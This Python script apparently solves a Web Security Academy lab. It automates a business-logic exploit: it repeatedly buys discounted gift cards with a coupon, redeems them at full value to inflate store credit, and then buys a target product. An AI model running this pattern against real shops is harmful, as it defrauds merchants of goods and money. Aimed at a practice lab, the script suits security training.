#!/usr/bin/env python3

import sys
import re
import asyncio, aiohttp
from bs4 import BeautifulSoup
from colorama import Fore, Style

def failwith(msg):
    print(f'{Fore.RED}{msg}{Style.RESET_ALL}')
    exit()

if len(sys.argv) <= 1:
    failwith('No lab instance ID specified')

INSTANCE_ID = sys.argv[1]

if not re.match('^[0-9a-f]{32}$', INSTANCE_ID):
    failwith('Invalid instance ID specified')

HOST = f'{INSTANCE_ID}.web-security-academy.net'
USER = 'wiener'; PASS = 'peter'
TARGET_PRODUCT_ID = 1
TARGET_PRODUCT_COST = 1337.0
GIFT_CARD_PRODUCT_ID = 2
GIFT_CARD_COST = 10.0
COUPON_CODE = 'SIGNUP30'
COUPON_DISCOUNT = 0.3

class Client:
    _session: aiohttp.ClientSession
    _csrf: str | None

    def __init__(self, host):
        self._session = aiohttp.ClientSession(f'https://{host}')
        self._csrf = None
    
    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self._session.close()

    """
    Obtains a CSRF token from the login page.
    We can reuse this token for all requests
    as the CSRF token is static for the session.
    """
    async def get_csrf(self):
        async with await self._session.get('/login') as res:
            if res.status != 200:
                raise Exception(f'Failed to get /login: {res.status} {res.reason}.')
            soup = BeautifulSoup(await res.content.read(), features='html.parser')
            csrf_tag = soup.select_one('form[class=login-form] input[name=csrf]')
            if not csrf_tag:
                raise Exception(f'Failed to find /login CSRF token.')
            return csrf_tag.attrs['value']

    async def login(self, username, password):
        if not self._csrf:
            self._csrf = await self.get_csrf()
        payload = { 'csrf': self._csrf, 'username': username, 'password': password }
        async with await self._session.post('/login', data=payload) as res:
            if res.status != 200:
                raise Exception(f'Failed to post /login: {res.status} {res.reason}')
            soup = BeautifulSoup(await res.content.read(), features='html.parser')
            csrf_tag = soup.select_one('form > input[name=csrf]')
            if not csrf_tag:
                raise Exception('Failed to find CSRF tag')
            self._csrf = csrf_tag.attrs['value']

    async def get_credit(self):
        async with await self._session.get('/my-account') as res:
            if res.status != 200:
                raise Exception(f'Failed to get /my-account: {res.status} {res.reason}')
            soup = BeautifulSoup(await res.content.read(), features='html.parser')
            credit_tag = soup.select_one('header[class=navigation-header] > p > strong')
            if not credit_tag:
                raise Exception(f'Failed to find credit tag on /my-account page')
            credit_text = credit_tag.text
            i = credit_text.index('$')
            if i < 0:
                raise Exception('Failed to find credit on /my-account page')
            return float(credit_text[(i+1):])

    async def add_products(self, product_id, quantity):
        payload = { 'productId': product_id, 'quantity': quantity, 'redir': 'CART' }
        async with await self._session.post('/cart', data=payload) as res:
            if res.status != 200:
                raise Exception(f'Failed to post /cart: {res.status} {res.reason}')

    async def apply_coupon(self, coupon):
        if not self._csrf:
            self._csrf = await self.get_csrf()
        payload = { 'csrf': self._csrf, 'coupon': coupon }
        async with await self._session.post('/cart/coupon', data=payload) as res:
            if res.status != 200:
                body = res.content.read_nowait().decode('utf8')
                raise Exception(f'Failed to post /cart/coupon: {res.status} {res.reason} {body}')

    async def purchase(self):
        payload = { 'csrf': self._csrf }
        res = await self._session.post('/cart/checkout', data=payload)
        if res.status != 200:
            raise Exception(f'Failed to post /cart/checkout: {res.status} {res.reason}')
        return res

    async def redeem_gift_card(self, card: str):
        payload = { 'csrf': self._csrf, 'gift-card': card }
        attempt = 1
        while attempt < 3:
            try:
                async with await self._session.post('/gift-card', data=payload) as res:
                    if res.status != 200:
                        raise Exception(f'Failed to post /gift-card: {res.status} {res.reason}')
                break
            except:
                attempt += 1

    async def redeem_gift_cards(self, cards: list[str]):
        await asyncio.gather(*[self.redeem_gift_card(card) for card in cards])

async def get_gift_cards(res: aiohttp.ClientResponse):
    soup = BeautifulSoup(await res.content.read(), features='html.parser')
    code_tags = soup.select('table[class=is-table-numbers] > tbody > tr > td')
    if len(code_tags) == 0:
        raise Exception(f'Failed to purchase gift cards')
    return [tag.text for tag in code_tags]

async def main():
    discount_multiplier = 1 - COUPON_DISCOUNT
    async with Client(HOST) as client:
        print(f'Logging in ... ')
        await client.login(USER, PASS)
        print(f'{Fore.GREEN}OK{Style.RESET_ALL}')
        credit = await client.get_credit()
        print(f'Credit: ${credit:.2f}')
        while credit < (TARGET_PRODUCT_COST * discount_multiplier):
            quantity = min(99, int(credit // (GIFT_CARD_COST * discount_multiplier)))
            if quantity <= 0:
                raise Exception('Out of credit')
            print(f'Adding {quantity} gift cards ... ')
            await client.add_products(GIFT_CARD_PRODUCT_ID, quantity)
            print(f'Applying coupon ... ')
            await client.apply_coupon(COUPON_CODE)
            print(f'Purchasing gift cards ... ')
            res = await client.purchase()
            gift_cards = await get_gift_cards(res)
            print(f'Redeeming {quantity} gift cards ... ')
            await client.redeem_gift_cards(gift_cards)
            credit = await client.get_credit()
            print(f'Credit: ${credit:.2f}')
        print(f'Adding target product ... ')
        await client.add_products(TARGET_PRODUCT_ID, 1)
        print(f'Applying coupon ... ')
        await client.apply_coupon(COUPON_CODE)
        print(f'Purchasing product ... ')
        await client.purchase()
        print(f'{Fore.GREEN}Lab should now be solved!{Style.RESET_ALL}')

try:
    asyncio.run(main())
except Exception as ex:
    print(f'{Fore.RED}Error: {ex}{Style.RESET_ALL}')
